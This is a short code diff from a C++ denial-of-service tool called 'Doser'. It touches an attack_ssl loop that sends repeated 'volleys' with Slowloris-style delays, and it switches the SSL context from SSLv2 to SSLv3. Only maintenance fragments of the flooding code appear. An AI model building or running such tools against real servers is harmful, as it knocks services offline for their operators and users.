@@ -109,13 +109,11 @@ void Doser::attack_ssl(const int *id){
         }
         message = std::to_string(*id) + ": Voly Sent";
         logger->Log(&message, Logger::Info);
-        //break;
         if(conf->vector == config::Slowloris){
             usleep(10000000);
         }else{
             usleep(30000);
         }
-
     }
 }
 
@@ -333,11 +331,10 @@ int Doser::randomInt(int min, int max){
 }
 
 SSL_CTX *Doser::InitCTX() {
-    SSL_METHOD *method;
+    const SSL_METHOD *method{SSLv3_client_method()};
     SSL_CTX *ctx;
-    OpenSSL_add_all_algorithms();
+    OpenSSL_add_ssl_algorithms();
     SSL_load_error_strings();
-    method = const_cast<SSL_METHOD *>(SSLv2_client_method());
     ctx = SSL_CTX_new(method);
     if (ctx == nullptr){
         logger->Log("Unable to connect using ssl", Logger::Error);
